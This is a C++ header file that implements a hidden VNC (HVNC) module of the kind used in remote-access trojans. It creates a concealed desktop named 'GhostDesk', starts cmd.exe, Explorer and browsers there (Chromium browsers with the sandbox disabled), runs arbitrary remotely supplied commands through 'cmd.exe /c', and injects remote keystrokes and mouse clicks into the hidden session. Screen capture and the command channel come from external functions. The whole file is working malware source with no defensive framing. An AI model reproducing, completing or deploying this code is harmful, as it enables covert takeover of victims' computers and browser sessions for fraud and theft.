#ifndef HVNC_H
#define HVNC_H

#include <windows.h>
#include <stdio.h>
#include <gdiplus.h>
#include <string>

using namespace Gdiplus;
using namespace std;

// --- HVNC Core ---
extern void SendPacket(int type, const char* data, int len);
extern void CaptureAndSendScreen();

bool bHVNCActive = false;
HDESK hHiddenDesk = NULL;
HDESK hOriginalDesk = NULL;

void CopyDir(const char* src, const char* dst) {
    char cmd[1024];
    snprintf(cmd, sizeof(cmd), "xcopy /E /I /Y \"%s\" \"%s\"", src, dst);
    WinExec(cmd, SW_HIDE);
}

void StartBrowser(const char* browserName, const char* exePath, const char* userDataPath) {
    if (GetFileAttributesA(exePath) == INVALID_FILE_ATTRIBUTES) return;

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    
    char dstPath[MAX_PATH];
    snprintf(dstPath, sizeof(dstPath), "%sGhost%s", tempPath, browserName);
    
    CreateDirectoryA(dstPath, NULL);

    char cmd[2048];
    if (strstr(browserName, "Chrome") || strstr(browserName, "Edge") || strstr(browserName, "Brave")) {
        snprintf(cmd, sizeof(cmd), "\"%s\" --user-data-dir=\"%s\" --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --disable-software-rasterizer", exePath, dstPath);
    } else {
        snprintf(cmd, sizeof(cmd), "\"%s\"", exePath);
    }

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.lpDesktop = (LPSTR)"GhostDesk"; 
    
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

void StartFirefox() {
    char path[MAX_PATH] = "";
    // Double backslashes for proper C++ string escaping
    ExpandEnvironmentStringsA("%ProgramFiles%\\Mozilla Firefox\\firefox.exe", path, MAX_PATH);
    
    if (GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES) {
        char cmd[1024];
        snprintf(cmd, sizeof(cmd), "\"%s\" -no-remote -CreateProfile \"GhostPanel\"", path);
        WinExec(cmd, SW_HIDE);
        Sleep(1000);
        
        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        si.lpDesktop = (LPSTR)"GhostDesk";
        
        char launchCmd[1024];
        snprintf(launchCmd, sizeof(launchCmd), "\"%s\" -no-remote -P \"GhostPanel\"", path);
        CreateProcessA(NULL, launchCmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    }
}

void StartExplorer() {
    char path[MAX_PATH] = "";
    GetWindowsDirectoryA(path, MAX_PATH);
    strncat(path, "\\explorer.exe", sizeof(path) - strlen(path) - 1);
    
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.lpDesktop = (LPSTR)"GhostDesk";
    CreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

void StartHVNC() {
    if (bHVNCActive) return;
    bHVNCActive = true;
    
    hOriginalDesk = GetThreadDesktop(GetCurrentThreadId());
    hHiddenDesk = CreateDesktopA("GhostDesk", NULL, NULL, 0, GENERIC_ALL, NULL);
    
    if (hHiddenDesk) {
        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        si.lpDesktop = (LPSTR)"GhostDesk";
        
        char cmd[] = "cmd.exe";
        CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    }
}

void StopHVNC() {
    bHVNCActive = false;
    if (hHiddenDesk) CloseDesktop(hHiddenDesk);
}

void ExecuteInHiddenDesk(const char* appCmd) {
    if (!hHiddenDesk) StartHVNC();
    
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.lpDesktop = (LPSTR)"GhostDesk";
    
    char cmd[1024];
    if (strstr(appCmd, "explorer")) {
        char path[MAX_PATH] = "";
        GetWindowsDirectoryA(path, MAX_PATH);
        strncat(path, "\\explorer.exe", sizeof(path) - strlen(path) - 1);
        strncpy(cmd, path, sizeof(cmd)-1);
    } else if (strstr(appCmd, "browser")) {
        char path[MAX_PATH] = "";
        ExpandEnvironmentStringsA("%ProgramFiles%\\Google\\Chrome\\Application\\chrome.exe", path, MAX_PATH);
        if (GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES) {
            StartBrowser("Chrome", path, "");
            return;
        }
        ExpandEnvironmentStringsA("%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe", path, MAX_PATH);
        if (GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES) {
            StartBrowser("Edge", path, "");
            return;
        }
        strcpy(cmd, "cmd.exe /c start https://google.com");
    } else {
        snprintf(cmd, sizeof(cmd), "cmd.exe /c %s", appCmd);
    }
    
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

void HandleHVNCInput(const char* data) {
    if (!hHiddenDesk) return;
    SetThreadDesktop(hHiddenDesk);
    
    if (data[0] == 'K') {
        int k, d;
        if (sscanf(data+1, "%d,%d", &k, &d) == 2) {
            INPUT i = {0};
            i.type = INPUT_KEYBOARD;
            i.ki.wVk = k;
            if (d == 0) i.ki.dwFlags = KEYEVENTF_KEYUP;
            SendInput(1, &i, sizeof(INPUT));
        }
    } else {
        float rx, ry; int f;
        if (sscanf(data, "%f,%f,%d", &rx, &ry, &f) == 3) {
            int w = GetSystemMetrics(SM_CXSCREEN);
            int h = GetSystemMetrics(SM_CYSCREEN);
            int x = (int)(rx * w);
            int y = (int)(ry * h);
            SetCursorPos(x, y);
            INPUT i = {0};
            i.type = INPUT_MOUSE;
            if (f & 1) { i.mi.dwFlags = MOUSEEVENTF_LEFTDOWN; SendInput(1, &i, sizeof(INPUT)); }
            if (f & 2) { i.mi.dwFlags = MOUSEEVENTF_LEFTUP; SendInput(1, &i, sizeof(INPUT)); }
            if (f & 4) { i.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN; SendInput(1, &i, sizeof(INPUT)); }
            if (f & 8) { i.mi.dwFlags = MOUSEEVENTF_RIGHTUP; SendInput(1, &i, sizeof(INPUT)); }
        }
    }
    SetThreadDesktop(hOriginalDesk);
}

#endif